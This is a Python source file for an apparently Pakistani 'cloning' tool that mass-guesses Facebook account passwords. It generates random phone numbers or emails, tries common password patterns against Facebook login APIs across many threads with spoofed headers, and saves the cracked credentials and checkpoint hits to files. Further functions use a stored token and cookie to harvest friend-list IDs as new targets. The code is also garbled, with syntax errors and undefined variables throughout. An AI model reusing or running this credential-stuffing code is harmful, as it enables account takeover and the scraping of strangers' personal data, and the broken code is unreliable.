
import os
import requests,random,sys,json,os,re
from time import sleep as slp
from os import system as cmd
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as Mr_javed_iqbal_sad_boy
import requests, os, re, bs4, uuid, sys, json, time, random, datetime, subprocess
from rich import print as mr_javed_Iqbal_sad_boy
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as Mr_javed_iqbal_sad_boy
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python BXB.py')
try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] request modules installing...')
    os.system('pip install requests')

try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] beautiful soup4 modules installing...')
    os.system('pip install bs4')

try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] rich modules installing...')
    os.system('pip install rich')

try:
	os.mkdir('/sdcard/BXB_ID')
except:
	pass
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
data,data2={},{}
Apk,ok,cp,id,user = [],[],[],[],[]
loop = 0
javed = []
minx = ' ------------------------------'
sagent=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	sagent.append(xd)
	
	
logo=("""\033[1;37m
 .d8b.  d88888D  .d8b.  d8b   db 
d8' `8b YP  d8' d8' `8b 888o  88 
88ooo88    d8'  88ooo88 88V8o 88 
88~~~88   d8'   88~~~88 88 V8o88 
88   88  d8' db 88   88 88  V888 
YP   YP d88888P YP   YP VP   V8P \033[1;35mX SHONI \033[1;37m                                                                 
----------------------------------------------
 Author    : A Z A N 
 Github    : MR-AZAN
 Facebook  : CHARLIE
 Tool Name : AXB TOOL
 Type type : FREE
 Version   : 1.9.8
----------------------------------------------
FOR GET ON ALLAHA ALMIGHTY 🥺❤️
\033[1;37m----------------------------------------------""")
cod,cod1,cod2,oO = [],[],[],[]
loop = 0
methods,crack_mode,geo,tf = [],[],[],[]

def main():
    print(BXB)
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] clone from file')
    mr_javed_Iqbal_sad_boy(' [2] clone random gmail+number')
    mr_javed_Iqbal_sad_boy(' [3] file creating and cute etc Menu')
    mr_javed_Iqbal_sad_boy(' [4] Number detail Finder
    mr_javed_Iqbal_sad_boy(' [0] exit-program')
    mr_javed_Iqbal_sad_boy(minx)
    opt = input(' [+] put:  ')
    if opt =='1':
    	os.system('clear')
    	print(BXB)
    	file_crack()
    elif opt =='2':
    	os.system('clear')
    	print(BXB);random_crack()
    elif opt =='3':
        creat_file()
    elif opt =='4':
    	number_detail()
    elif opt =='0':
        exit("\033[1;92m[+] Good bye")
    else:
        mr_javed_Iqbal_sad_boy('\n Choose valid option ... ');os.system ("clear")
        main()
def random_crack():
    global ok,cp,tf
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] Random Number')
    mr_javed_Iqbal_sad_boy(' [2] Random Email ')
    mr_javed_Iqbal_sad_boy(' [0] main-menu')
    mr_javed_Iqbal_sad_boy(minx)
    opt = input(' [+] put: ')   
    if opt =='1':
        os.system('clear && rm -rf .rn.txt')
        print(BXB)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' [+] any country code without + ')
        mr_javed_Iqbal_sad_boy(minx)
        code = input(' [+] put code: ')
        os.system('clear')
        print(BXB)
        for xd in range(5000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_javed_Iqbal_sad_boy(minx)
            mr_javed_Iqbal_sad_boy(' [+] Total ids: '+total_ids)            
            mr_javed_Iqbal_sad_boy(' [+] Use flight mode for speed')
            mr_javed_Iqbal_sad_boy(minx)
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps,'khan123','khan1234','khan12345','khan786']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' The process has completed')
        mr_javed_Iqbal_sad_boy(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        os.system('clear && rm -rf .re.txt')
        print(BXB)
        first = input(' [+] put first name: ')
        os.system('clear')
        print(BXB)
        last = input(' [+] put last name: ')
        os.system('clear')
        print(BXB)
        domain = input('\n [+] put domain: ')
        os.system('clear')
        print(BXB)
        lists = ['3','4']
        for xd in range(4999):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        xd_ps=input('  Do you want additional passwords (y/n) ? ')
        fo = open('.re.txt', 'r').read().splitlines()
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_javed_Iqbal_sad_boy(minx)
            mr_javed_Iqbal_sad_boy(' Total ids: '+total_ids)
            mr_javed_Iqbal_sad_boy(' Use flight mode for speed')
            mr_javed_Iqbal_sad_boy(minx)
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'Khan'
                fs = first_name.lower()
                ls = last_name.lower()
                if xd_ps =='n':
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
                else:
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' The process has completed')
        mr_javed_Iqbal_sad_boy(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='0':
        main()
    else:
        mr_javed_Iqbal_sad_boy('please put correct adress... ')
        time.sleep(1)
        random_crack()

def file_crack():
    global ok,cp,tf
    os.system('clear')
    print(BXB)
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] Method ')
    mr_javed_Iqbal_sad_boy(' [2] Method ')
    mr_javed_Iqbal_sad_boy(' [3] Method ')
    mr_javed_Iqbal_sad_boy(' [4] Method ')
    mr_javed_Iqbal_sad_boy(minx)
    opt_method = input(' [+] put method: ')
    os.system('clear')
    print(BXB)
    file = input(' [+] put file path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        mr_javed_Iqbal_sad_boy(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
        ps_limit = int(input('\nhow many password do you want to add? '))
    except:
        ps_limit =1
    print(' ')
    for i in range(ps_limit):
        plist.append(input(f' Put password {i+1}: '))
    with Mr_javed_iqbal_sad_boy(max_workers=25) as crack_submit:
        os.system('clear')
        print(BXB)
        total_ids = str(len(fo))
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' total ids: '+total_ids)
        mr_javed_Iqbal_sad_boy(' use flight mode for speed')
        mr_javed_Iqbal_sad_boy(minx)
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if opt_method =='1':
                crack_submit.submit(method1,ids,names,passlist,total_ids)
            elif opt_method =='2':
                crack_submit.submit(method2,ids,names,passlist,total_ids)
            elif opt_method =='3':
                crack_submit.submit(method3,ids,names,passlist,total_ids)
            elif opt_method =='4':
                crack_submit.submit(method4,ids,names,passlist,total_ids)
            else:
                mr_javed_Iqbal_sad_boy(' something wrong in methods ');exit()
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' The process has completed')
    mr_javed_Iqbal_sad_boy(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M1| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = "https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            hed1 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
            req1 = r.get(url1,headers=hed1)
            data = {
            'Isd': lsd, 
            'jazoest': j2, 
            'ccp' : ccp, 
            'reg_instance' :reg_i, 
            'submission_request':'true', 
            'helper' : '', 
            'reg_impression_id' :reg_id, 
            'ns' :'0',
            'zero_header_af_client' :'', 
            'app_Id' :'', 
            'logger_id':'', 
            'field_names[]':[
                'firstnames', 
                'reg_email__', 
                'sex', 
                'birthday_wrapper', 
                'reg_password__' 
            ], 
            'firstname' :'nmf', 
            'lastname' :'nmf', 
            'reg_mail':id, 
            'sex' :str(random. choice(['1','2'])), 
            'custom_gender' :'', 
            'did_u_age':'fasle', 
            'birthday_day' :dayy, 
            'birthday_month':monn, 
            'birthday_year' :yearr, 
            'age_setup_input' :'', 
            'reg_passwd':paswrd, 
            'submit' :'sign_up' 
           } 
            url2 = 'https://b-api.facebook.com/method/auth.login'
            hed2 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
            print(' \033[1;32m[AXB-OK] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\033[1;31m[AXB-CP] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
        loop+=1
    except Exception as e:
        pass
def method2(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M2| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = "https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            hed1 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
            req1 = r.get(url1,headers=hed1)
            data = {
            'Isd': lsd, 
            'jazoest': j2, 
            'ccp' : ccp, 
            'reg_instance' :reg_i, 
            'submission_request':'true', 
            'helper' : '', 
            'reg_impression_id' :reg_id, 
            'ns' :'0',
            'zero_header_af_client' :'', 
            'app_Id' :'', 
            'logger_id':'', 
            'field_names[]':[
                'firstnames', 
                'reg_email__', 
                'sex', 
                'birthday_wrapper', 
                'reg_password__' 
            ], 
            'firstname' :'nmf', 
            'lastname' :'nmf', 
            'reg_mail':id, 
            'sex' :str(random. choice(['1','2'])), 
            'custom_gender' :'', 
            'did_u_age':'fasle', 
            'birthday_day' :dayy, 
            'birthday_month':monn, 
            'birthday_year' :yearr, 
            'age_setup_input' :'', 
            'reg_passwd':paswrd, 
            'submit' :'sign_up' 
           } 
            url2 = 'https://b-api.facebook.com/method/auth.login'
            hed2 = {'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':ua_string,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT'
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
            print(' \033[1;32m[AXB-OK] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\033[1;31m[AXB-CP] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
        loop+=1
    except Exception as e:
        pass
def method3(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M3| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = "https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            hed1 = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"}
            req1 = r.get(url1,headers=hed1)
            data = {
            'Isd': lsd, 
            'jazoest': j2, 
            'ccp' : ccp, 
            'reg_instance' :reg_i, 
            'submission_request':'true', 
            'helper' : '', 
            'reg_impression_id' :reg_id, 
            'ns' :'0',
            'zero_header_af_client' :'', 
            'app_Id' :'', 
            'logger_id':'', 
            'field_names[]':[
                'firstnames', 
                'reg_email__', 
                'sex', 
                'birthday_wrapper', 
                'reg_password__' 
            ], 
            'firstname' :'nmf', 
            'lastname' :'nmf', 
            'reg_mail':id, 
            'sex' :str(random. choice(['1','2'])), 
            'custom_gender' :'', 
            'did_u_age':'fasle', 
            'birthday_day' :dayy, 
            'birthday_month':monn, 
            'birthday_year' :yearr, 
            'age_setup_input' :'', 
            'reg_passwd':paswrd, 
            'submit' :'sign_up' 
           } 
            url2 = 'https://b-api.facebook.com/method/auth.login'
            hed2 = {'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':ua_string,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT'
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
            print(' \033[1;32m[AXB-OK] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\033[1;31m[AXB-CP] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
        loop+=1
    except Exception as e:
        pass
def method4(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M4| %s | OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            data={"adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email":ids,
            "password":pas,
            "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
            "generate_session_cookies":"1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_PK",
            "client_country_code": "PK",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            post = r.post("https://graph.facebook.com/auth/login",data=data)
            q = json.loads(post.text)
            if 'session_key' in q:
            print(' \033[1;32m[AXB-OK] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
            oks.append(ids)
            break
     elif 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
            print('\033[1;31m[AXB-CP] '+roid+' | '+pas+'\033[0;97m')
            open('/sdcard/AXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
         else:continue
        loop+=1
    except Exception as e:
        pass
def random_method(ids,passlist,total_ids):
    global ua,loop,ok,cp,tf,ua_opera
    smm = random.choice(sagent)
    sys.stdout.write('\r \033[1;37m%s | OK:%s | CP:%s  '%(loop,len(ok),len(cp)));sys.stdout.flush()
    try:
        for pas in passlist:
            xyz = requests.Session()
            header = ({
                'authority': 'free.facebook.com',
			'method': 'GET',
			'path': '/login/device-based/login/async/',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://free.facebook.com',
			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agen': 'Mozilla/5.0 (Linux; Android 11; Infinix X657B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)'
            })
            url =( 'https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1')
#https://mbasic.facebook.com'
            raw = xyz.get(url).text
            payload = {
        'batch': '[{"method":"POST","body":"format=json&device_id=0cd272a7-17dc-4766-958e-5b48799250bf&email='+ids+'&password='+pas+'&credentials_type=password&generate_session_cookies=1&error_detail_type=button_with_disabled&machine_id='+random_machine_id()+'&locale=en_US&client_country_code=US&fb_api_req_friendly_name=authenticate","name":"authenticate","omit_response_on_success":false,"relative_url":"method/auth.login"},{"method":"POST","body":"query_id=10153437257771729&method=get&strip_nulls=true&query_params=%7B%220%22%3A75%2C%221%22%3A120%2C%222%22%3A480%7D&locale=en_US&client_country_code=US&fb_api_req_friendly_name=GetLoggedInUserQuery","name":"getLoggedInUser","depends_on":"authenticate","omit_response_on_success":false,"relative_url":"graphql?access_token={result=authenticate:$.access_token}"}]','fb_api_caller_class': 'com.facebook.katana.server.handler.Fb4aAuthHandler','fb_api_req_friendly_name': 'authLogin'
        }
            post_request = xyz.post("https://b-api.facebook.com/method/auth.login")
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            #open('regular_login.html','w').write(post_request)
            cookies = xyz.cookies.get_dict().keys()
            if 'c_user' in cookies:
                    print('\033[1;32m[AXB-SUCCESSFULL] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/BXB_ID/ok.txt', 'a').write(ids+' | '+pas+'\n').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    pass
                else:
                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[AXB-2FACTOR] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/BXB_ID/random2f.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            print('\033[1;31m[AXB-CHECKPOINT] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/BXB_ID/randomcp.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
        loop+=1
    except Exception as e:
        pass

#--(file-create)----#
def create_file():
        try:
                tok = open('/sdcard/.token.txt', 'r').read()
                cok = open('/sdcard/.cok.txt', 'r').read()
        except:
                print(" Login Required");time.sleep(2)
                _qlog()
        try:
                r = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':cok})
                name = json.loads(r.text)['name']
        except:
                name = "User"
                _qlog()
        bot()
        os.system("clear");print(logo)
        print(f" Welcome {name} Fb Ids File Create Menu")
        print(50*"-")
        print("[1] Create File Normally")
        print("[2] Create File by File")
        print("[0] Go Back ")
        print(50*"-")
        fileme = input(" Select Any Option : ")
        if fileme in ["1","01","one"]:
                normal_file()
        if fileme in ["2","02","two"]:
                bulk_file()
        if fileme in ["00","0","zero"]:
                sys.stdout.write("Redirecting To Main Page ..."),
                time.sleep(2)
                sys.stdout.flush()
                caseher()
        else:
                exit("Invalid Option")

def normal_file():
        limbo = "5000"
        rr = byy(0,20)
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system('clear');print(logo)
        ###u_q_l = int(input(" How Many Ids To Add ? "))
        file_s = input(' Example /sdcard/xxx.txt\n Save file As : ')
        os.system('rm -rf '+file_s)
        file_s3 = ".aid.txt"
        try:
                qs=input(f' Input Id : ').split("|")[0]
                sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit('+limbo+')&access_token='+token, cookies={'cookie':cookie}).text
                qsr= json.loads(sy)
                _fleq=open(file_s3,"a")
                for abbas in qsr['friends']['data']:
                        uids=abbas['id']
                        name=abbas['name']
                        bc=uids+"|"+name
                        _fleq.write(bc+'\n')
        except KeyError:
                if 'invalid' in str(sy):
                        print(f'{r}Your Cookie Is Lol{s}')
                        exit()
                else:
                        print(f"[{A}{Z}{N}]\033[1;91m Friend List Is Prvate Bro {r}{qs}{s}\033[1;97m")
                        time.sleep(5)
                        caseher()
        xbc = open(file_s3, 'r').readlines()
        print(f" \tLimit Less Than {str(len(xbc))}")
        limit=int(input(f" How Many Ids Do you want to Extract \n Limit {str(len(xbc))} : "))
        if limit > len(xbc):
                print(f"{r}\t Error ! Type Less Then {str(len(xbc))} {s}")
                time.sleep(3)
                caseher()
        else:
                pass
        for i in range(limit):
                lines = open(file_s3).readlines()
                Types = [line.split("|")[0] for line in lines]
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
                        _fileq=open(file_s,"a")
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                _fileq.write(bc+'\n')
                        thn = open(file_s, 'r').readlines()
                        sys.stdout.write(f"\r Sucessfully Dump : {rg}{qs}{s}{ro}/[{str(len(thn))}]{s}"),
                        sys.stdout.flush()
                        _fileq.close()
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Token Is Lol{s}')
                                exit()
                        else:
                                pass
                except IOError:
                        pass
        print(50*"-")
        tot = open(file_s, 'r').readlines()
        print(' \033[1;97m Process Completed  ')
        print(f'  Total ids  : {rg}'+str(len(tot)))
        print(f'  {s}File saved as: {rp}'+file_s)
        print(50*"\033[1;97m-")

        input('\033[0m[Press enter to back] ')
        caseher()
def bulk_file():

        bc=[]
        rr = byy(0,20)
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system('clear');print(logo);print('\tFile Create Menu 2\n===============================================\n')
        _file_s = input('   Path of Old File From Which ids Extract \n Example /sdcard/xxx.txt : ')
        try:
                qais=open(_file_s,'r').readlines()
        except FileNotFoundError:
                print(f"{r}File Not Founded{s}");time.sleep(3)
                caseher()
        __file_s2 = input(' Save File As Example /sdcard/xxx.txt\n Save as : ')
        os.system('rm -rf '+__file_s2)
        print(f"\t {rc}Dont Type Limit Greater Then {s}{str(len(qais))}")
        limit=int(input(f" How Many Ids Do you want to Extract \n Limit {str(len(qais))} : "))
        if limit > len(qais):
                print(f"{r}\t Errorrr ! Type Less Then {str(len(qais))} {s}")
                time.sleep(3)
                caseher()
        for i in range(1,limit):
                lines = open(_file_s).readlines()
                Types = [line.split("|")[0] for line in lines]
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
                        _fileq=open(__file_s2,"a")
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                _fileq.write(bc+'\n')
                        thn = open(_fileq, 'r').readlines()
                        sys.stdout.write(f"\r Sucessfully Dump : {rg}{qs}{s}{ro}/[{str(len(thn))}]{s}"),
                        sys.stdout.flush()
                        _fileq.close()
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Cookie Is Lol{s}')
